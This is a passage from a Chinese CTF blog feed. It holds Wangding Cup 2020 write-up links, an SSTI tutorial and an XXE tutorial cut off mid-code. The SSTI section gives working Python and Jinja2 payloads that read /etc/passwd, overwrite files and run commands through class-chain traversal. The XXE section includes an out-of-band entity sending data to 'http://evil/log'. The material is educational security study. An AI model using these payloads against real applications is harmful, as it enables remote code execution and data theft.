      <url>/2020/05/14/2020-wang-ding-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="1-青龙组"><a href="#1-青龙组" class="headerlink" title="1.  青龙组"></a>1.  青龙组</h1><h2 id="1-1-misc"><a href="#1-1-misc" class="headerlink" title="1.1  misc"></a>1.1  misc</h2><h3 id="1-1-1-teslaaaaa"><a href="#1-1-1-teslaaaaa" class="headerlink" title="1.1.1  teslaaaaa"></a>1.1.1  teslaaaaa</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>网鼎杯-武为止戈  <a href="https://bbs.pediy.com/thread-259472.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-259472.htm</a></p><h3 id="1-1-2-虚幻2"><a href="#1-1-2-虚幻2" class="headerlink" title="1.1.2  虚幻2"></a>1.1.2  虚幻2</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://www.cnblogs.com/kevinbruce656/p/12869764.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevinbruce656/p/12869764.html</a></p><h2 id="2-2-crypto"><a href="#2-2-crypto" class="headerlink" title="2.2  crypto"></a>2.2  crypto</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://0xdktb.top/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/" target="_blank" rel="noopener">https://0xdktb.top/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/</a></p><h1 id="2-白虎组"><a href="#2-白虎组" class="headerlink" title="2.  白虎组"></a>2.  白虎组</h1><h2 id="2-1-misc"><a href="#2-1-misc" class="headerlink" title="2.1  misc"></a>2.1  misc</h2><h3 id="2-1-1-hidden"><a href="#2-1-1-hidden" class="headerlink" title="2.1.1  hidden"></a>2.1.1  <strong>hidden</strong></h3><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://blog.csdn.net/qq_32261191/article/details/106139450?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/qq_32261191/article/details/106139450?fps=1&amp;locationNum=2</a></p><h3 id="2-1-2-密码柜"><a href="#2-1-2-密码柜" class="headerlink" title="2.1.2  密码柜"></a>2.1.2  密码柜</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="http://shangdixinxi.com/detail-1427159.html" target="_blank" rel="noopener">http://shangdixinxi.com/detail-1427159.html</a></p><p><strong>2、</strong><a href="https://www.cnblogs.com/p201821440039/p/12898784.html" target="_blank" rel="noopener">https://www.cnblogs.com/p201821440039/p/12898784.html</a></p><h2 id="2-2-crypto-1"><a href="#2-2-crypto-1" class="headerlink" title="2.2  crypto"></a>2.2  crypto</h2><h2 id="2-3-reverse"><a href="#2-3-reverse" class="headerlink" title="2.3  reverse"></a>2.3  reverse</h2><h3 id="2-3-1-PY"><a href="#2-3-1-PY" class="headerlink" title="2.3.1  PY"></a>2.3.1  PY</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://bbs.pediy.com/thread-259529.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-259529.htm</a></p><p><strong>2、</strong><a href="https://l0x1c.github.io/2020/05/15/2020-5-14/#PY" target="_blank" rel="noopener">https://l0x1c.github.io/2020/05/15/2020-5-14/#PY</a></p><h3 id="2-3-2-hero"><a href="#2-3-2-hero" class="headerlink" title="2.3.2  hero"></a>2.3.2  hero</h3><p><strong>1、</strong><a href="https://bbs.pediy.com/thread-259532.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-259532.htm</a></p><p><strong>2、</strong><a href="https://l0x1c.github.io/2020/05/15/2020-5-14/#HERO" target="_blank" rel="noopener">https://l0x1c.github.io/2020/05/15/2020-5-14/#HERO</a></p><h3 id="2-3-3-幸运数字"><a href="#2-3-3-幸运数字" class="headerlink" title="2.3.3  幸运数字"></a>2.3.3  幸运数字</h3><p><strong>1、</strong><a href="https://l0x1c.github.io/2020/05/15/2020-5-14/#%E5%B9%B8%E8%BF%90%E6%95%B0%E5%AD%97" target="_blank" rel="noopener">https://l0x1c.github.io/2020/05/15/2020-5-14/#%E5%B9%B8%E8%BF%90%E6%95%B0%E5%AD%97</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>best_python</title>
      <link href="/2020/05/11/best-python/"/>
      <url>/2020/05/11/best-python/</url>
      
        <content type="html"><![CDATA[<h1 id="1-python漏洞分析"><a href="#1-python漏洞分析" class="headerlink" title="1.  python漏洞分析"></a>1.  python漏洞分析</h1><h2 id="1-1-python（反序列化）"><a href="#1-1-python（反序列化）" class="headerlink" title="1.1  python（反序列化）"></a>1.1  python（反序列化）</h2><h2 id="2-1-python（ssti模板注入）"><a href="#2-1-python（ssti模板注入）" class="headerlink" title="2.1  python（ssti模板注入）"></a>2.1  python（ssti模板注入）</h2><p>SSTI <code>(服务器模板注入)</code>。</p><h3 id="2-1-1-attribution"><a href="#2-1-1-attribution" class="headerlink" title="2.1.1  attribution"></a>2.1.1  attribution</h3><h4 id="2-1-1-1-class"><a href="#2-1-1-1-class" class="headerlink" title="2.1.1.1  __class__"></a>2.1.1.1  <code>__class__</code></h4><p>Python中有一个<code>__class__</code>可以获取实例对应的类，比如一个空字符串<code>&quot;&quot;.__class__</code>就可以获取到 <code>&lt;type &#39;str&#39;&gt;</code>， 那这个字符串同样也可以换成列表，元组，字典。 </p><p><img src="/2020/05/11/best-python/1.png" alt=".__class__"></p><h4 id="2-1-1-2-mro"><a href="#2-1-1-2-mro" class="headerlink" title="2.1.1.2   __mro__"></a>2.1.1.2   <code>__mro__</code></h4><p><code>__mro__</code> 这个属性可以获取到当前对象的所有继承类， 这个属性返回一个tuple对象，这个对象包含了当前类对象所有继承的基类，tuple中元素的顺序就是MRO（Method Resolution  Order）寻找的顺序。或者用<strong>base</strong>这个属性也可以获取到基本类。 </p><p><img src="/2020/05/11/best-python/3.png" alt="python2"></p><p><img src="/2020/05/11/best-python/2.png" alt="python3"></p><h3 id="2-1-2-function"><a href="#2-1-2-function" class="headerlink" title="2.1.2  function"></a>2.1.2  function</h3><h4 id="2-1-2-1-subclasses"><a href="#2-1-2-1-subclasses" class="headerlink" title="2.1.2.1  __ subclasses __()"></a>2.1.2.1  <code>__ subclasses __()</code></h4><p>类对象中的方法 <code>__subclasses__()</code>会返回类中所有存活子类的引用（不是实例），那如果我们用object类调用这个方法的话，就可以返回所有的类对象了。（object类对象是所有类的父类） </p><pre class="line-numbers language-python"><code class="language-python">如下是在windows的Python2环境中测试的，linux下的<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">0</span> <span class="token operator">&lt;</span>type <span class="token string">'type'</span><span class="token operator">></span><span class="token number">1</span> <span class="token operator">&lt;</span>type <span class="token string">'weakref'</span><span class="token operator">></span><span class="token number">2</span> <span class="token operator">&lt;</span>type <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token number">3</span> <span class="token operator">&lt;</span>type <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token number">4</span> <span class="token operator">&lt;</span>type <span class="token string">'int'</span><span class="token operator">></span><span class="token number">5</span> <span class="token operator">&lt;</span>type <span class="token string">'basestring'</span><span class="token operator">></span><span class="token number">6</span> <span class="token operator">&lt;</span>type <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token number">7</span> <span class="token operator">&lt;</span>type <span class="token string">'list'</span><span class="token operator">></span><span class="token number">8</span> <span class="token operator">&lt;</span>type <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token number">9</span> <span class="token operator">&lt;</span>type <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token number">10</span> <span class="token operator">&lt;</span>type <span class="token string">'traceback'</span><span class="token operator">></span><span class="token number">11</span> <span class="token operator">&lt;</span>type <span class="token string">'super'</span><span class="token operator">></span><span class="token number">12</span> <span class="token operator">&lt;</span>type <span class="token string">'xrange'</span><span class="token operator">></span><span class="token number">13</span> <span class="token operator">&lt;</span>type <span class="token string">'dict'</span><span class="token operator">></span><span class="token number">14</span> <span class="token operator">&lt;</span>type <span class="token string">'set'</span><span class="token operator">></span><span class="token number">15</span> <span class="token operator">&lt;</span>type <span class="token string">'slice'</span><span class="token operator">></span><span class="token number">16</span> <span class="token operator">&lt;</span>type <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token number">17</span> <span class="token operator">&lt;</span>type <span class="token string">'complex'</span><span class="token operator">></span><span class="token number">18</span> <span class="token operator">&lt;</span>type <span class="token string">'float'</span><span class="token operator">></span><span class="token number">19</span> <span class="token operator">&lt;</span>type <span class="token string">'buffer'</span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">&lt;</span>type <span class="token string">'long'</span><span class="token operator">></span><span class="token number">21</span> <span class="token operator">&lt;</span>type <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token number">22</span> <span class="token operator">&lt;</span>type <span class="token string">'property'</span><span class="token operator">></span><span class="token number">23</span> <span class="token operator">&lt;</span>type <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">&lt;</span>type <span class="token string">'tuple'</span><span class="token operator">></span><span class="token number">25</span> <span class="token operator">&lt;</span>type <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token number">26</span> <span class="token operator">&lt;</span>type <span class="token string">'reversed'</span><span class="token operator">></span><span class="token number">27</span> <span class="token operator">&lt;</span>type <span class="token string">'code'</span><span class="token operator">></span><span class="token number">28</span> <span class="token operator">&lt;</span>type <span class="token string">'frame'</span><span class="token operator">></span><span class="token number">29</span> <span class="token operator">&lt;</span>type <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token number">30</span> <span class="token operator">&lt;</span>type <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token number">31</span> <span class="token operator">&lt;</span>type <span class="token string">'function'</span><span class="token operator">></span><span class="token number">32</span> <span class="token operator">&lt;</span>type <span class="token string">'classobj'</span><span class="token operator">></span><span class="token number">33</span> <span class="token operator">&lt;</span>type <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token number">34</span> <span class="token operator">&lt;</span>type <span class="token string">'generator'</span><span class="token operator">></span><span class="token number">35</span> <span class="token operator">&lt;</span>type <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token number">36</span> <span class="token operator">&lt;</span>type <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token number">37</span> <span class="token operator">&lt;</span>type <span class="token string">'instance'</span><span class="token operator">></span><span class="token number">38</span> <span class="token operator">&lt;</span>type <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token number">39</span> <span class="token operator">&lt;</span>type <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token number">40</span> <span class="token operator">&lt;</span>type <span class="token string">'file'</span><span class="token operator">></span><span class="token number">41</span> <span class="token operator">&lt;</span>type <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token number">42</span> <span class="token operator">&lt;</span>type <span class="token string">'cell'</span><span class="token operator">></span><span class="token number">43</span> <span class="token operator">&lt;</span>type <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token number">44</span> <span class="token operator">&lt;</span>type <span class="token string">'iterator'</span><span class="token operator">></span><span class="token number">45</span> <span class="token operator">&lt;</span>type <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token number">46</span> <span class="token operator">&lt;</span>type <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token number">47</span> <span class="token operator">&lt;</span>type <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token number">48</span> <span class="token operator">&lt;</span>type <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token number">49</span> <span class="token operator">&lt;</span>type <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token number">50</span> <span class="token operator">&lt;</span>type <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token number">51</span> <span class="token operator">&lt;</span>type <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token number">52</span> <span class="token operator">&lt;</span>type <span class="token string">'sys.getwindowsversion'</span><span class="token operator">></span><span class="token number">53</span> <span class="token operator">&lt;</span>type <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token number">54</span> <span class="token operator">&lt;</span>type <span class="token string">'module'</span><span class="token operator">></span><span class="token number">55</span> <span class="token operator">&lt;</span>type <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token number">56</span> <span class="token operator">&lt;</span>type <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token number">57</span> <span class="token operator">&lt;</span>type <span class="token string">'nt.stat_result'</span><span class="token operator">></span><span class="token number">58</span> <span class="token operator">&lt;</span>type <span class="token string">'nt.statvfs_result'</span><span class="token operator">></span><span class="token number">59</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token number">60</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token number">61</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token number">62</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token number">63</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token number">64</span> <span class="token operator">&lt;</span>type <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token number">65</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token number">66</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token number">67</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token number">68</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token number">69</span> <span class="token operator">&lt;</span>type <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token number">70</span> <span class="token operator">&lt;</span>type <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token number">71</span> <span class="token operator">&lt;</span>type <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token number">72</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token number">73</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token number">74</span> <span class="token operator">&lt;</span>type <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token number">75</span> <span class="token operator">&lt;</span>type <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token number">76</span> <span class="token operator">&lt;</span>type <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token number">77</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token number">78</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token number">79</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token number">80</span> <span class="token operator">&lt;</span>type <span class="token string">'operator.itemgetter'</span><span class="token operator">></span><span class="token number">81</span> <span class="token operator">&lt;</span>type <span class="token string">'operator.attrgetter'</span><span class="token operator">></span><span class="token number">82</span> <span class="token operator">&lt;</span>type <span class="token string">'operator.methodcaller'</span><span class="token operator">></span><span class="token number">83</span> <span class="token operator">&lt;</span>type <span class="token string">'functools.partial'</span><span class="token operator">></span><span class="token number">84</span> <span class="token operator">&lt;</span>type <span class="token string">'MultibyteCodec'</span><span class="token operator">></span><span class="token number">85</span> <span class="token operator">&lt;</span>type <span class="token string">'MultibyteIncrementalEncoder'</span><span class="token operator">></span><span class="token number">86</span> <span class="token operator">&lt;</span>type <span class="token string">'MultibyteIncrementalDecoder'</span><span class="token operator">></span><span class="token number">87</span> <span class="token operator">&lt;</span>type <span class="token string">'MultibyteStreamReader'</span><span class="token operator">></span><span class="token number">88</span> <span class="token operator">&lt;</span>type <span class="token string">'MultibyteStreamWriter'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>windows的python2比linux的多一个<code>&lt;type &#39;sys.getwindowsversion&#39;&gt;</code></p><p><img src="/2020/05/11/best-python/4.png" alt="对比图"></p><p>object类的第40号元素就是一个有读文件功能的类对象。 </p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#python2</span>cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">in</span> str<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> cnt<span class="token punctuation">,</span>item        cnt<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        cnt<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">continue</span><span class="token comment" spellcheck="true">#  40 &lt;type 'file'></span><span class="token comment" spellcheck="true">#  [Finished in 0.1s]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>读取/etc/passwd&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()向已存在的文件内写入内容，并会把原有的内容进行覆盖。&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/flag&#39;,&#39;w&#39;).write(&#39;test&#39;)</code></pre><h4 id="2-1-2-2-system-command"><a href="#2-1-2-2-system-command" class="headerlink" title="2.1.2.2  system  command"></a>2.1.2.2  system  command</h4><p>以下皆以python2为例：</p><p>访问os模块都是从warnings.catch_warnings模块入手的，模块位置为59（linux下）， <code>__init__</code>用于将对象实例化，func_globals可以看该模块下有哪些globals函数，而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。 </p><pre><code>文件读取&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].os.popen(&#39;id&#39;).read()&#39;uid=1000(hzdl) gid=1000(hzdl) groups=1000(hzdl),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)\n&#39;-----------------------------------------------------------------------------------------RCE，执行system(&quot;ls&quot;)object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)-----------------------------------------------------------------------------------------</code></pre><p><code>object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code> 下有eval，<code>__import__</code>等的全局函数。</p><pre><code>&gt;&gt;&gt; object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]&lt;built-in function eval&gt;</code></pre><h3 id="2-1-3-漏洞实例"><a href="#2-1-3-漏洞实例" class="headerlink" title="2.1.3  漏洞实例"></a>2.1.3  漏洞实例</h3><h4 id="2-1-3-1-flask-ssti（python3）"><a href="#2-1-3-1-flask-ssti（python3）" class="headerlink" title="2.1.3.1  flask ssti（python3）"></a>2.1.3.1  flask ssti（python3）</h4><pre><code>#python3#Flask version:0.12.2#Jinja2: 2.10from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    name = request.args.get(&#39;name&#39;, &#39;guest&#39;)    t = Template(&quot;Hello &quot; + name)    return t.render()if __name__ == &quot;__main__&quot;:    app.run(host=&quot;127.0.0.1&quot;, port=10110,debug=True)</code></pre><p><strong>判断存在ssti模板注入：</strong></p><p><img src="/2020/05/11/best-python/5.png" alt="example"></p><p><strong>命令执行：</strong></p><pre><code>命令执行：{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}```![popen](./best_python/6.png)**文件读取：**```文件读取：{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('d:\\flag', 'r').read() }}{% endif %}{% endfor %}</code></pre><p><img src="/2020/05/11/best-python/7.png" alt="文件读取"></p><h4 id="2-1-3-2-flask-ssti（python2）"><a href="#2-1-3-2-flask-ssti（python2）" class="headerlink" title="2.1.3.2  flask ssti（python2）"></a>2.1.3.2  flask ssti（python2）</h4><pre><code>#注入变量执行命令详见 http://www.freebuf.com/articles/web/98928.html#读文件：{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code></pre><h3 id="2-1-4-instrument"><a href="#2-1-4-instrument" class="headerlink" title="2.1.4  instrument"></a>2.1.4  instrument</h3><h4 id="2-1-4-1-tplmap"><a href="#2-1-4-1-tplmap" class="headerlink" title="2.1.4.1  tplmap"></a>2.1.4.1  tplmap</h4><pre><code>git clone https://github.com/epinna/tplmap./tplmap.py -u &lt;url&gt;</code></pre><p><strong>参考资料：</strong></p><p><strong>1、</strong>一篇文章带你理解漏洞之 SSTI 漏洞  <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#%E5%AE%9E%E4%BE%8B%E4%B8%80%EF%BC%9A" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#%E5%AE%9E%E4%BE%8B%E4%B8%80%EF%BC%9A</a></p><p><strong>2、</strong>Templates Injections Payload:   <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></p><p><strong>3、</strong><code>浅析SSTI(python沙盒绕过)</code> <a href="http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/</a></p><p><strong>4、</strong>FLASK模板注入 <code>（SSTI）</code> <a href="https://blog.csdn.net/yh1013024906/article/details/84330056" target="_blank" rel="noopener">https://blog.csdn.net/yh1013024906/article/details/84330056</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF_WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>best_xss</title>
      <link href="/2020/05/11/best-xss/"/>
      <url>/2020/05/11/best-xss/</url>
      
        <content type="html"><![CDATA[<p>参考资料：</p><p><strong>1、</strong><code>prompt(1)</code> to win平台通关记录   <a href="https://xz.aliyun.com/t/4507" target="_blank" rel="noopener">https://xz.aliyun.com/t/4507</a></p><p><strong>2、</strong><code>prompt(1) to win</code>  —–XSS学习笔记  <a href="https://blog.csdn.net/qq_35078631/article/details/77073233" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/77073233</a></p><p><strong>3、</strong>scuctf赛后自闭  <a href="https://blog.csdn.net/weixin_44057967/article/details/90524180" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44057967/article/details/90524180</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF_WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>best_xxe</title>
      <link href="/2020/05/11/best-xxe/"/>
      <url>/2020/05/11/best-xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="1-xxe基础"><a href="#1-xxe基础" class="headerlink" title="1.  xxe基础"></a>1.  xxe基础</h1><h2 id="1-1-语法"><a href="#1-1-语法" class="headerlink" title="1.1  语法"></a>1.1  语法</h2><h3 id="1-1-1-XML语法"><a href="#1-1-1-XML语法" class="headerlink" title="1.1.1  XML语法"></a>1.1.1  XML语法</h3><p>XML可扩展标记语言，被设计用来传输和存储数据，其形式多样。XML 被设计为传输和存储数据，其焦点是数据的内容。HTML相比于XML，被设计用来显示数据，其焦点是数据的外观。XML可以把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。</p><p><img src="/2020/05/11/best-xxe/1.png" alt="xml基本语法"></p><p><img src="/2020/05/11/best-xxe/2.png" alt="example"></p><h3 id="1-1-2-DTD语法"><a href="#1-1-2-DTD语法" class="headerlink" title="1.1.2  DTD语法"></a>1.1.2  DTD语法</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。<br>带有 DTD 的 XML 文档实例如下所示：</p><p><img src="/2020/05/11/best-xxe/3.png" alt="DTD语法"></p><blockquote><p>内部声明DTD：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p>DOCTYPE（DTD的声明）</p><p>引用外部DTD：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>SYSTEM、PUBLIC（外部资源申请）</p></blockquote><h4 id="1-1-2-1-DTD实体"><a href="#1-1-2-1-DTD实体" class="headerlink" title="1.1.2.1  DTD实体"></a>1.1.2.1  DTD实体</h4><blockquote><p>字符实体:    <code>&amp;#aaa;      &amp;#xaaa;</code><br>命名实体:   <code>&lt;!ENTITY x &quot;First Param!&quot;&gt;</code><br>外部实体： <code>&lt;!ENTITY xxe SYSTEM &quot;file:///c://test/1.txt&quot; &gt;]&gt;</code><br>参数实体： <code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code><br>内部实体：内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义<br><code>&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#37; xxe SYSTEM &quot;http://evil/log?%payload;&quot; &gt;&#39;</code></p></blockquote><h3 id="1-1-3-XML运用"><a href="#1-1-3-XML运用" class="headerlink" title="1.1.3  XML运用"></a>1.1.3  XML运用</h3><h4 id="1-1-3-1-XML-DTD"><a href="#1-1-3-1-XML-DTD" class="headerlink" title="1.1.3.1  XML + DTD"></a>1.1.3.1  XML + DTD</h4><p>命名实体+外部实体写法: </p><p><img src="/2020/05/11/best-xxe/4.png" alt="命名+外部"></p><p>命名实体+外部实体+参数实体写法: </p><p><img src="/2020/05/11/best-xxe/5.png" alt="命名+外部+参数"></p><h4 id="1-1-3-2-XML-PHP"><a href="#1-1-3-2-XML-PHP" class="headerlink" title="1.1.3.2  XML + PHP"></a>1.1.3.2  XML + PHP</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Disable the ability to load external entities</span>    <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Represents an entire HTML or XML document; serves as the root of the document tree. </span>    <span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span 